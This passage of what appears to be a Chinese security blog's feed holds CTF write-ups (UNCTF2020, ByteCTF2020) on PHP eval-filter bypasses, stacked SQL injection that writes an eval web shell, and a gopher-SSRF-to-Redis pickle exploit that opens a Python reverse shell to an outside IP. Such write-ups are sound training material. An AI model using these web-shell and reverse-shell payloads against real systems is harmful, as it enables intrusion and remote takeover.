class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;\`&#x27;</span>,<span class="string">&#x27;\+&#x27;</span>,<span class="string">&#x27;\-&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;\&quot;&#x27;</span>,<span class="string">&#x27;\\\\&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>);</span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell_exec&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;ob_start&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/m&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;WTF???&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sry,try again&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>预期解，利用PHP5.6新引入的特性——变长参数</p><p><a href="https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html">https://www.leavesongs.com/PHP/bypass-eval-length-restrict.html</a></p><p>和Python中的<code>**kwargs</code>，类似，在PHP中可以使用 <code>func(...$arr)</code>这样的方式，将<code>$arr</code>数组展开成多个参数，传入func函数。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?1[]&#x3D;test&amp;1[]&#x3D;system(%27ls%20&#x2F;%27);&amp;2&#x3D;assert</span><br><span class="line">POST</span><br><span class="line">code&#x3D;usort(...$_GET);</span><br></pre></td></tr></table></figure><p>也就是相当于执行了<code>usort([&quot;test&quot;, &quot;system('ls /');&quot;], assert);</code></p><p>P年的那篇文章还提到了可以利用文件包含写shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code&#x3D;$_GET[a](N,a,8);&amp;a&#x3D;file_put_contents</span><br></pre></td></tr></table></figure><p>用脚本自动跑一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbOV0pOw&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    url = <span class="string">&quot;http://fda5225d-9b6e-4633-985e-7b0fca4a99ac.node1.hackingfor.fun/1nD3x.php?code=$_GET[a](A,&#123;&#125;,8);&amp;a=file_put_contents&quot;</span>.format(s)</span><br><span class="line">    print(url)</span><br><span class="line">    res = requests.get(url)</span><br><span class="line">    <span class="comment"># print(res.status_code)</span></span><br></pre></td></tr></table></figure><p>base64编码后的一句话已经写入了A文件，再文件包含这个A文件。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201118212038.png" alt=""></p><h2 id="俄罗斯方块">俄罗斯方块</h2><p>题目有提示用到wasm，网上先稍微了解一下。查看源代码发现是有wasm.gz的源文件。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117220752.png" alt=""></p><p>拼接一下文件名下载下来解压之后拿到<code>blocks.wasm</code>，再用wabt工具集中的wasm2wat对其进行反编译</p><blockquote><p><a href="https://github.com/WebAssembly/wabt">https://github.com/WebAssembly/wabt</a></p><p><a href="https://webassembly.github.io/wabt/doc/wasm2wat.1.html">https://webassembly.github.io/wabt/doc/wasm2wat.1.html</a></p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221818.png" alt=""></p><p>反编译之后打开wat文件我人都傻了，啥都看不懂，后来我把所有能用的工具试了一下，就是没想到在反编译后的文件中查找99999关键字</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221631.png" alt=""></p><p>再修改这个分数，最后编译成wasm文件</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117221929.png" alt=""></p><p>把源码保存下来，替换掉block.wasm.gz，在本地起服务，再随便玩玩拿到flag。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201117231202.png" alt=""></p><h2 id="ezphp">ezphp</h2><p>题目这样出我真的。。。。没想到</p><p>并不知道username和password的确切的值，要用php绕类型比较进行绕过，构造paylaod：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">&quot;username&quot;</span>=&gt;<span class="literal">True</span>,<span class="string">&quot;password&quot;</span>=&gt;<span class="literal">True</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 得到: a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p>POST参数即可得到flag</p><h2 id="checkin-sql">checkin-sql</h2><p>强网杯2019随便住魔改，提示flag不在数据库中，那么就肯定要写shell了。</p><p>堆叠注入查表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;;show tables;</span><br></pre></td></tr></table></figure><p>查表字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#39;;desc 0xDktb;</span><br></pre></td></tr></table></figure><p>用预处理和十六进制编码<code>select * from 0xDktb</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;set @a&#x3D;0x73656c656374202a2066726f6d20603078446b746260;prepare execsql from @a; execute execsql;</span><br></pre></td></tr></table></figure><p>发现被过滤掉了<code>set</code>关键字。（在比赛的时候没想到可以直接不要set语句。。。</p><p>改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c656374202a2066726f6d20603078446b746260;execute execsql;</span><br></pre></td></tr></table></figure><p>发现可以执行成功，那么直接写shell<code>select '&lt;?php @eval($_POST[ccc]);?&gt;' into outfile '/var/www/html/shell.php'</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;; prepare execsql from 0x73656c65637420273c3f70687020406576616c28245f504f53545b6363635d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f7368656c6c2e70687027;execute execsql;</span><br></pre></td></tr></table></figure><p>用蚁剑连接拿flag。</p><h2 id="赛后收获">赛后收获</h2><ul><li>flask模板注入过滤了关键字或者下划线可以用管道符+join的方式绕过；</li><li><code>is_file()</code>函数的参数是一个数组的时候会返回一个NULL；</li><li>.htaccess可以用换行的方式绕过关键字黑名单</li><li>接上一条，如果过滤了<code>\</code>，在.htaccess中解析某个后缀为cgi文件，再上传一个cgi文件运行后读取flag；</li><li>PHP复杂变量解析；</li><li>PHP5.6以后版本有变长参数的特性；</li><li>在代码注入的题目中还可以用这种方式写入shell：<code>$_GET[a](N,a,8);&amp;a=file_put_contents</code>，再用PHP伪协议读取；</li><li>SQL注入预编译过了<code>set</code>，可以直接用<code>prepare execsql from 0x....</code></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;UNCTF2020-Web-wp&quot;&gt;UNCTF2020 Web wp&lt;/h1&gt;
&lt;h2 id=&quot;easyssrf-solved&quot;&gt;easyssrf [solved]&lt;/h2&gt;
&lt;p&gt;算是签到题，比较easy&lt;/p&gt;
&lt;figure class=&quot;highlight
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2020-scrapy_redis复现</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-11-05T15:30:44.000Z</published>
    <updated>2020-11-05T15:32:20.766Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2020复现">ByteCTF2020复现</h1><p>这web题目出的简直就是神仙。。</p><h2 id="easy-scrapy">easy_scrapy</h2><p>首页是一个可以提交URL的输入框，验证码给出了md5加密后的前5位，可以直接写Python脚本爆破。添加数据的时候，在VPS监听端口：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201102143549.png" alt=""></p><p>从上图中可以看出使用的是scrapy+redis，应该是url数据会存储在Redis中，然后用scrapy爬虫爬取。</p><p>添加完数据后，在MyUrlList中会显示数据，点击记录，发现会访问<code>http://101.200.50.18:30010/result?url=http://xx.xx.xxx.xx:8888/</code>，可能存在SSRF，监听端口：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201102141039.png" alt=""></p><p>后面<code>/result?url</code>则是用了另一种功能进行pycurl的请求，类似于<code>curl</code>，同样支持使用Gopher协议。</p><p>复现时候也用SSRF常见利用方式探测端口以及Redis的服务信息，但是没有什么收获。</p><p>转变一下思路，既然是爬虫，那么遇到<code>&lt;a&gt;</code>标签，他就有可能去请求：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104155454.png" alt=""></p><p>既然是这样，那么就可以把<code>&lt;a&gt;</code>标签的href改成file协议造成任意文件读取：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104162527.png" alt=""></p><p>OK，验证成功。那么这样的话，就可以读取题目的爬虫源码，但是在读之前，需要知道爬虫源码的绝对路径。可以通过读取<code>/etc/self/environ</code>得到工作路径</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104170859.png" alt=""></p><p>显示当前<code>PWD=/code</code>，但是我们还不知道项目结构，可以去<a href="https://scrapy-chs.readthedocs.io/zh_CN/0.24/intro/tutorial.html">官方文档</a>中找到这个爬虫框架的结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tutorial&#x2F;</span><br><span class="line">    scrapy.cfg</span><br><span class="line">    tutorial&#x2F;</span><br><span class="line">        __init__.py</span><br><span class="line">        items.py</span><br><span class="line">        pipelines.py</span><br><span class="line">        settings.py</span><br><span class="line">        spiders&#x2F;</span><br><span class="line">            __init__.py</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><p>这些文件分别是:</p><ul><li><code>scrapy.cfg</code>: 项目的配置文件</li><li><code>tutorial/</code>: 该项目的python模块。之后您将在此加入代码。</li><li><code>tutorial/items.py</code>: 项目中的item文件.</li><li><code>tutorial/pipelines.py</code>: 项目中的pipelines文件.</li><li><code>tutorial/settings.py</code>: 项目的设置文件.</li><li><code>tutorial/spiders/</code>: 放置spider代码的目录.</li></ul><p>首先去看项目配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Automatically created by: scrapy startproject</span><br><span class="line">#</span><br><span class="line"># For more information about the [deploy] section see:</span><br><span class="line"># https:&#x2F;&#x2F;scrapyd.readthedocs.io&#x2F;en&#x2F;latest&#x2F;deploy.html</span><br><span class="line"></span><br><span class="line">[settings]</span><br><span class="line">default &#x3D; bytectf.settings</span><br><span class="line"></span><br><span class="line">[deploy]</span><br><span class="line">#url &#x3D; http:&#x2F;&#x2F;localhost:6800&#x2F;</span><br><span class="line">project &#x3D; bytectf</span><br></pre></td></tr></table></figure><p>得知项目名是<code>bytectf</code>，但是还需要知道<code>bytectf</code>文件夹下的<code>spiders</code>的爬虫文件名。</p><p>读取<code>/proc/self/cmdline</code>，这个文件包含进程的完整命令行信息，我们可以根据他来得知正在运行的爬虫的文件名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python &#x2F;usr&#x2F;local&#x2F;bin&#x2F;scrapy crawl byte</span><br></pre></td></tr></table></figure><p>那么当前的爬虫名字是byte。</p><p>读取源码，得到结构如下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201104172101.png" alt=""></p><p>通过piplelines.py和settings.py分别得到了MongoDB和Redis的配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//pipelines.py</span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        MONGODB_HOST = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_USER = <span class="string">&#x27;N0rth3&#x27;</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(<span class="string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line"></span><br><span class="line">        quote_info = dict(item)</span><br><span class="line">        print(quote_info)</span><br><span class="line">        self.table.insert(quote_info)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//settings.py</span><br><span class="line">BOT_NAME = <span class="string">&#x27;bytectf&#x27;</span></span><br><span class="line">SPIDER_MODULES = [<span class="string">&#x27;bytectf.spiders&#x27;</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">&#x27;bytectf.spiders&#x27;</span></span><br><span class="line">RETRY_ENABLED = <span class="literal">False</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">DOWNLOAD_TIMEOUT = <span class="number">8</span></span><br><span class="line">USER_AGENT = <span class="string">&#x27;scrapy_redis&#x27;</span></span><br><span class="line">SCHEDULER = <span class="string">&quot;scrapy_redis.scheduler.Scheduler&quot;</span></span><br><span class="line">DUPEFILTER_CLASS = <span class="string">&quot;scrapy_redis.dupefilter.RFPDupeFilter&quot;</span></span><br><span class="line">REDIS_HOST = <span class="string">&#x27;172.20.0.7&#x27;</span></span><br><span class="line">REDIS_PORT = <span class="number">6379</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line"> <span class="string">&#x27;bytectf.pipelines.BytectfPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及主要的爬虫逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span>(<span class="params">RedisSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;byte&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url</span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>,url):</span><br><span class="line">                r = scrapy.Request(url,callback=self.parse2,dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">            url_list.append(url)</span><br><span class="line">            <span class="keyword">if</span>(len(url_list)&gt;<span class="number">3</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure><p>到这里，我用<a href="https://bycsec.top/">byc404</a>写好的docker-compose在本地起爬虫，跟线上的bot+redis+mongo环境基本一致。</p><blockquote><p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a></p></blockquote><blockquote><p>Github上的环境缺一个文件，需要在<code>easyscrapy/python/bytectf/spiders</code>加一个<code>__init__.py</code>文件。不然scrapy会报没有spiders库。</p></blockquote><p>三个containers启动了之后可以看到爬虫服务已经start了。Redis在本机也映射到了6379端口，进入Redis容器可以看到现在没有keys：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201105194319.png" alt=""></p><p><a href="http://xn--fill-z94fz69b9j1ahda5675ayyp.py">在本机上运行fill.py</a>，需要提前安装<code>https://github.com/wuchengwei0122/redis-py.git</code></p><p>相当于向Redis循环200次添加<code>start_urls:http//baidu.com</code>，这个时候就可以看到<code>byte:requests</code>键存在序列化数据：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201105202111.png" alt=""></p><p>那么利用链就是想办法写入<code>byte:requests</code>键，内容为序列化数据，而写入的方法就是pycurl的SSRF，利用Gopher协议打Redis。</p><p>贴一个官方的exp，用python3生成poc，反弹shell：</p><blockquote><p>由于<code>byte:requests</code>有序列表是zset，需要在Redis上执行ZADD命令。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;119.45.184.10&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">test = str(pickle.dumps(exp()))</span><br><span class="line">poc = test.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&#x27;\\n&#x27;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">poc =<span class="string">&#x27;gopher://172.20.0.7:6379/_&#x27;</span>+quote(<span class="string">&#x27;ZADD byte:requests 0 &quot;&#x27;</span>)+quote(poc)+quote(<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p>用GET打过去的时候需要二次URL编码。</p><p>参考文章：</p><p><a href="https://northity.com/2020/10/30/ByteCTF%E5%88%9D%E8%B5%9B%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">https://northity.com/2020/10/30/ByteCTF初赛出题笔记/</a></p><p><a href="http://blog.ccreater.top/2020/10/26/2020ByteCTF/">http://blog.ccreater.top/2020/10/26/2020ByteCTF/</a></p><p><a href="https://www.jianshu.com/p/0823666a7687">https://www.jianshu.com/p/0823666a7687</a></p><p><a href="https://blog.csdn.net/zwq912318834/article/details/78854571">https://blog.csdn.net/zwq912318834/article/details/78854571</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ByteCTF2020复现&quot;&gt;ByteCTF2020复现&lt;/h1&gt;
&lt;p&gt;这web题目出的简直就是神仙。。&lt;/p&gt;
&lt;h2 id=&quot;easy-scrapy&quot;&gt;easy_scrapy&lt;/h2&gt;
&lt;p&gt;首页是一个可以提交URL的输入框，验证码给出了md5加密后的前5位
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTFShow-Web-Writeup</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/25.CTFShow-Web%E5%85%A5%E9%97%A8/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/25.CTFShow-Web%E5%85%A5%E9%97%A8/</id>
    <published>2020-10-29T09:19:26.000Z</published>
    <updated>2020-11-17T13:13:28.393Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTFShow-Web-Writeup">CTFShow Web Writeup</h1><h2 id="web入门-命令执行">web入门 命令执行</h2><h3 id="web29">web29</h3><p>考点：通配符绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span 